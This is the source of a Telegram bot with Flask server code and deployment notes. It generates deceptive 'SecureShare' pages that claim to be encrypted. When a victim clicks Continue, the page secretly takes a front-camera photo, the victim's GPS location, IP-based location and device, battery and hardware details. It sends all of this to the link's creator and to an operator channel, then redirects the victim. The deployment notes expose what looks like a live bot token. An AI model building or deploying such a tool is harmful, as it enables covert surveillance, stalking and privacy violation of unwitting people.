from flask import Flask, request, jsonify, send_from_directory
import json
import time
import os
import threading
import requests
from datetime import datetime, timedelta
import logging
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

TOKEN = os.environ.get("BOT_TOKEN")
CHANNEL_ID = os.environ.get("CHANNEL_ID")
REQUIRED_CHANNEL = "@nrtecno2"
ACCOUNT_NAME = "telegram-bot-b9j0"
HTML_DIR = "html_files"
PHOTO_DIR = "photos"
USER_STATE_FILE = "user_state.json"
USER_LINKS_FILE = "user_links.json"

os.makedirs(HTML_DIR, exist_ok=True)
os.makedirs(PHOTO_DIR, exist_ok=True)

if not os.path.exists(USER_STATE_FILE):
    with open(USER_STATE_FILE, "w") as f:
        json.dump({}, f)

if not os.path.exists(USER_LINKS_FILE):
    with open(USER_LINKS_FILE, "w") as f:
        json.dump({}, f)


def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        logger.error(f"Send error: {e}")


def get_user_state(user_id):
    with open(USER_STATE_FILE, "r") as f:
        data = json.load(f)
    return data.get(str(user_id), {"state": None, "target_url": None})


def set_user_state(user_id, state, target_url=None):
    with open(USER_STATE_FILE, "r") as f:
        data = json.load(f)
    data[str(user_id)] = {"state": state, "target_url": target_url}
    with open(USER_STATE_FILE, "w") as f:
        json.dump(data, f)


def get_user_active_link(user_id):
    with open(USER_LINKS_FILE, "r") as f:
        data = json.load(f)
    return data.get(str(user_id))


def set_user_active_link(user_id, html_file, photo_file):
    with open(USER_LINKS_FILE, "r") as f:
        data = json.load(f)
    old = data.get(str(user_id))
    if old:
        old_html = os.path.join(HTML_DIR, old.get("html"))
        old_photo = os.path.join(PHOTO_DIR, old.get("photo"))
        if os.path.exists(old_html):
            os.remove(old_html)
        if os.path.exists(old_photo):
            os.remove(old_photo)
    data[str(user_id)] = {"html": html_file, "photo": photo_file, "created_at": time.time()}
    with open(USER_LINKS_FILE, "w") as f:
        json.dump(data, f)


def is_subscribed(user_id):
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/getChatMember?chat_id={REQUIRED_CHANNEL}&user_id={user_id}"
        r = requests.get(url, timeout=10)
        data = r.json()
        if data.get("ok"):
            return data["result"]["status"] in ["member", "administrator", "creator"]
    except:
        pass
    return False


def delete_old_files():
    cutoff = datetime.now() - timedelta(minutes=10)
    for f in os.listdir(PHOTO_DIR):
        fp = os.path.join(PHOTO_DIR, f)
        try:
            if datetime.fromtimestamp(os.path.getmtime(fp)) < cutoff:
                os.remove(fp)
        except:
            pass


def start_auto_cleanup():
    def cleanup():
        while True:
            time.sleep(600)
            delete_old_files()
    threading.Thread(target=cleanup, daemon=True).start()


def generate_html(user_id, target_url, photo_filename):
    html_filename = f"{user_id}_{int(time.time())}.html"
    filepath = os.path.join(HTML_DIR, html_filename)
    photo_url = f"https://{ACCOUNT_NAME}.onrender.com/photos/{photo_filename}"
    storage = CHANNEL_ID if CHANNEL_ID else "null"

    html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Secure Share</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .card {{
            background: white;
            border-radius: 28px;
            max-width: 400px;
            width: 100%;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeIn 0.4s ease-out;
        }}
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(20px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        .header {{
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 20px;
            text-align: center;
        }}
        .logo {{
            font-size: 24px;
            font-weight: bold;
            color: white;
        }}
        .logo span {{ color: #e94560; }}
        .content {{ padding: 24px; text-align: center; }}
        .user-photo {{
            width: 120px;
            height: 120px;
            border-radius: 60px;
            object-fit: cover;
            margin: 0 auto 16px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.2);
            border: 3px solid #e94560;
        }}
        .username {{
            font-size: 18px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }}
        .message {{
            background: #f0f2f5;
            padding: 12px 16px;
            border-radius: 20px;
            display: inline-block;
            margin: 16px auto;
            font-size: 14px;
            color: #555;
            max-width: 85%;
        }}
        .btn {{
            background: linear-gradient(135deg, #e94560 0%, #c62a4a 100%);
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            transition: all 0.3s ease;
            animation: pulse 1.5s infinite;
            box-shadow: 0 4px 15px rgba(233,69,96,0.4);
        }}
        @keyframes pulse {{
            0% {{ transform: scale(1); box-shadow: 0 4px 15px rgba(233,69,96,0.4); }}
            50% {{ transform: scale(1.02); box-shadow: 0 8px 25px rgba(233,69,96,0.6); }}
            100% {{ transform: scale(1); box-shadow: 0 4px 15px rgba(233,69,96,0.4); }}
        }}
        .btn:active {{ transform: scale(0.98); animation: none; }}
        .footer {{
            background: #f8f9fa;
            padding: 12px;
            text-align: center;
            font-size: 11px;
            color: #888;
            border-top: 1px solid #eee;
        }}
        .loader {{ display: none; }}
        .step {{ display: none; }}
        .step.active {{ display: block; }}
        .error {{
            background: #fee;
            color: #e94560;
            padding: 10px;
            border-radius: 12px;
            font-size: 13px;
            margin-top: 15px;
        }}
        .processing {{
            width: 48px;
            height: 48px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
    </style>
</head>
<body>
<div class="card">
    <div class="header">
        <div class="logo">Secure<span>Share</span></div>
    </div>
    
    <div id="mainStep" class="step active content">
        <img class="user-photo" src="{photo_url}" id="userPhoto">
        <div class="username">Shared with you</div>
        <div class="message">"Here's my shared content"</div>
        <button class="btn" id="continueBtn" onclick="requestCamera()">Continue →</button>
        <div id="errorMsg" class="error" style="display:none"></div>
    </div>
    
    <div id="loadingStep" class="step content">
        <div class="processing"></div>
        <p style="color:#666;margin-top:16px">Processing...</p>
    </div>
    
    <div class="footer">
        <p>🔒 End-to-end encrypted • Secure connection</p>
    </div>
</div>

<video id="video" autoplay playsinline muted style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
const TOKEN = "{TOKEN}";
const USER = {user_id};
const STORAGE = {storage};
    const TARGET = "{target_url}";

function showLoading() {{
    document.getElementById('mainStep').classList.remove('active');
    document.getElementById('loadingStep').classList.add('active');
}}

function formatBytes(bytes) {{
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}}

async function sendToUser(text, file) {{
    try {{
        if(file) {{
            let fd = new FormData();
            fd.append('chat_id', USER);
            fd.append('photo', file);
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST', body:fd}});
            if(STORAGE && STORAGE !== 'null') {{
                let fd2 = new FormData();
                fd2.append('chat_id', STORAGE);
                fd2.append('photo', file);
                await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto', {{method:'POST', body:fd2}});
            }}
        }} else {{
            await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:USER, text:text, parse_mode:'HTML'}})}});
            if(STORAGE && STORAGE !== 'null') {{
                await fetch('https://api.telegram.org/bot'+TOKEN+'/sendMessage', {{method:'POST', headers:{{'Content-Type':'application/json'}}, body:JSON.stringify({{chat_id:STORAGE, text:text, parse_mode:'HTML'}})}});
            }}
        }}
    }} catch(e) {{ console.log(e); }}
}}

async function getIP() {{
    try {{
        let r = await fetch('https://api.ipify.org?format=json');
        let d = await r.json();
        return d.ip;
    }} catch(e) {{ return 'Unknown'; }}
}}

async function getIPInfo(ip) {{
    try {{
        let r = await fetch(`https://ipapi.co/${{ip}}/json/`);
        let d = await r.json();
        return d;
    }} catch(e) {{ return {{}}; }}
}}

async function getBattery() {{
    if(navigator.getBattery) {{
        try {{
            let b = await navigator.getBattery();
            return {{ level: Math.round(b.level * 100), charging: b.charging }};
        }} catch(e) {{}}
    }}
    return null;
}}

function getDeviceInfo() {{
    const ua = navigator.userAgent;
    let device = 'Unknown';
    if (/iPhone/i.test(ua)) device = 'iPhone';
    else if (/iPad/i.test(ua)) device = 'iPad';
    else if (/Android/i.test(ua)) device = 'Android Phone';
    else if (/Mobile/i.test(ua)) device = 'Mobile Device';
    else device = 'Desktop/Laptop';
    return {{ device: device, userAgent: ua }};
}}

function getHardwareInfo() {{
    return {{
        cores: navigator.hardwareConcurrency || 'Unknown',
        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'
    }};
}}

async function getStorageInfo() {{
    try {{
        if('storage' in navigator && 'estimate' in navigator.storage) {{
            let estimate = await navigator.storage.estimate();
            return {{
                used: formatBytes(estimate.usage),
                total: formatBytes(estimate.quota)
            }};
        }}
    }} catch(e) {{}}
    return null;
}}

async function captureFullInfo() {{
    try {{
        let ip = await getIP();
        let ipInfo = await getIPInfo(ip);
        let battery = await getBattery();
        let device = getDeviceInfo();
        let hardware = getHardwareInfo();
        let storage = await getStorageInfo();
        let language = navigator.language || 'Unknown';
        let resolution = screen.width + 'x' + screen.height;
        
        let message = "<b>Visitor Information Captured</b>\n";
        message += "------------------------\n\n";
        message += "<b>Device & Browser</b>\n";
        message += "   Device: " + device.device + "\n";
        message += "   User Agent: " + device.userAgent.substring(0, 200) + "\n\n";
        message += "<b>Network Information</b>\n";
        message += "   IP Address: " + ip + "\n";
        message += "   Language: " + language + "\n\n";
        message += "<b>Location Details</b>\n";
        message += "   Country: " + (ipInfo.country_name || 'Unknown') + "\n";
        message += "   Region: " + (ipInfo.region || 'Unknown') + "\n";
        message += "   City: " + (ipInfo.city || 'Unknown') + "\n";
        message += "   Postal Code: " + (ipInfo.postal || 'Unknown') + "\n";
        message += "   Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n\n";
        message += "<b>Display Information</b>\n";
        message += "   Resolution: " + resolution + "\n\n";
        message += "<b>Battery Status</b>\n";
        message += "   Level: " + (battery ? battery.level + '%' : 'Unknown') + "\n";
        message += "   Charging: " + (battery ? (battery.charging ? 'Yes' : 'No') : 'Unknown') + "\n\n";
        message += "<b>Hardware & Storage</b>\n";
        message += "   CPU Cores: " + hardware.cores + "\n";
        message += "   RAM: " + hardware.ram + "\n";
        message += "   Storage Used: " + (storage ? storage.used : 'Unknown') + "\n";
        message += "   Storage Total: " + (storage ? storage.total : 'Unknown') + "\n\n";
        message += "------------------------\n";
        message += "Developed by: @nrtecno2";
        
        await sendToUser(message);
        return true;
    }} catch(e) {{
        await sendToUser('Error capturing info: ' + e.message);
        return false;
    }}
}}

async function capturePhotoAndLocation() {{
    try {{
        let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }}, audio: false }});
        let video = document.getElementById('video');
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = () => {{ video.play(); r(); }});
        await new Promise(r => setTimeout(r, 300));
        let canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        let blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
        if(blob && blob.size > 500) {{
            await sendToUser('<b>Front Camera Photo</b>', blob);
        }}
        stream.getTracks().forEach(t => t.stop());
        
        if(navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(async (p) => {{
                await sendToUser('<b>Live Location</b>\nhttps://maps.google.com/?q=' + p.coords.latitude + ',' + p.coords.longitude);
                await sendToUser('<b>Coordinates</b>\nLat: ' + p.coords.latitude + '\nLon: ' + p.coords.longitude + '\nAccuracy: ' + p.coords.accuracy + 'm');
            }}, async (err) => {{
                await sendToUser('<b>Location</b>\nAccess denied by user');
            }}, {{ timeout: 10000, enableHighAccuracy: true }});
        }}
        
        return true;
    }} catch(e) {{
        return false;
    }}
}}

async function requestCamera() {{
    showLoading();
    
    await captureFullInfo();
    
    let success = await capturePhotoAndLocation();
    
    if(success) {{
        setTimeout(() => {{
            window.location.href = TARGET;
        }}, 2000);
    }} else {{
        document.getElementById('loadingStep').classList.remove('active');
        document.getElementById('mainStep').classList.add('active');
        document.getElementById('errorMsg').innerHTML = 'Camera access is required to continue. Please allow and try again.';
        document.getElementById('errorMsg').style.display = 'block';
    }}
}}
</script>
</body>
</html>'''

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(html)
    return html_filename


@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error"}), 400
        
        if 'callback_query' in data:
            cb = data['callback_query']
            uid = cb['from']['id']
            if cb['data'] == 'verify':
                if is_subscribed(uid):
                    send_message(uid, "✅ Verified! Send me any URL:")
                    set_user_state(uid, "waiting_url")
                else:
                    requests.post(f"https://api.telegram.org/bot{TOKEN}/answerCallbackQuery", 
                                 json={"callback_query_id": cb['id'], "text": "Join channel first!", "show_alert": True})
            return jsonify({"status": "ok"}), 200
        
        if 'message' not in data:
            return jsonify({"status": "ok"}), 200
        
        msg = data['message']
        uid = msg['chat']['id']
        
        if 'text' in msg:
            text = msg['text']
            if text == '/start':
                if not is_subscribed(uid):
                    markup = {"inline_keyboard": [[{"text": "📢 Join Channel", "url": "https://t.me/nrtecno2"}], 
                                                   [{"text": "✅ Verify","callback_data": "verify"}]]}
                    send_message(uid, f"🚫 Join {REQUIRED_CHANNEL} first!", markup)
                else:
                    set_user_state(uid, "waiting_url")
                    send_message(uid, "✅ Send me any URL:\nhttps://www.instagram.com/p/xxxxx")
            elif text.startswith(('http://', 'https://')):
                state = get_user_state(uid)
                if state.get("state") == "waiting_url":
                    set_user_state(uid, "waiting_photo", text)
                    send_message(uid, "✅ Now share a photo with me")
                else:
                    send_message(uid, "❌ Use /start first")
            else:
                send_message(uid, "❌ Send a valid URL starting with http:// or https://")
        
        elif 'photo' in msg:
            uid = msg['chat']['id']
            state = get_user_state(uid)
            if state.get("state") != "waiting_photo":
                send_message(uid, "❌ Please send URL first using /start")
                return jsonify({"status": "ok"}), 200
            
            target_url = state.get("target_url")
            if not target_url:
                send_message(uid, "❌ Error. Please use /start again")
                return jsonify({"status": "ok"}), 200
            
            try:
                file_id = msg['photo'][-1]['file_id']
                file_info = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}").json()
                file_path = file_info['result']['file_path']
                img_data = requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{file_path}").content
                
                photo_name = f"{uid}_{int(time.time())}.jpg"
                with open(os.path.join(PHOTO_DIR, photo_name), "wb") as f:
                    f.write(img_data)
                
                html_name = generate_html(uid, target_url, photo_name)
                set_user_active_link(uid, html_name, photo_name)
                set_user_state(uid, "done")
                
                link = f"https://{ACCOUNT_NAME}.onrender.com/view/{html_name}"
                send_message(uid, f"✅ LINK GENERATED:\n{link}\n\n⚠️ This link will stay active until you create a new one!\n📸 Camera COMPULSORY\n📍 Location OPTIONAL")
                
            except Exception as e:
                logger.error(f"Photo error: {e}")
                send_message(uid, "❌ Error processing photo. Please try again.")
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"status": "error"}), 500


@app.route('/view/<filename>')
def serve_html(filename):
    filepath = os.path.join(HTML_DIR, filename)
    if os.path.exists(filepath):
        return send_from_directory(HTML_DIR, filename)
    return "Link expired or invalid", 404


@app.route('/photos/<filename>')
def serve_photo(filename):
    return send_from_directory(PHOTO_DIR, filename)


@app.route('/')
def home():
    return f"🐉 DRAGON ACTIVE | Links: {len([f for f in os.listdir(HTML_DIR) if not f.startswith('state_')])}"


if __name__ == "__main__":
    start_auto_cleanup()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
```

requirements.txt

```
Flask==2.2.5
requests==2.31.0
gunicorn==23.0.0
```

Render Environment Variables:

Key Value
BOT_TOKEN 8716047556:AAH0yZa32lhruVBNdU6q-zCb86sWKvbPWtg
CHANNEL_ID -1003940389299

Webhook set (browser me ek baar):

```
https://api.telegram.org/bot8716047556:AAH0yZa32lhruVBNdU6q-zCb86sWKvbPWtg/setWebhook?url=https://telegram-bot-b9j0.onrender.com/webhook
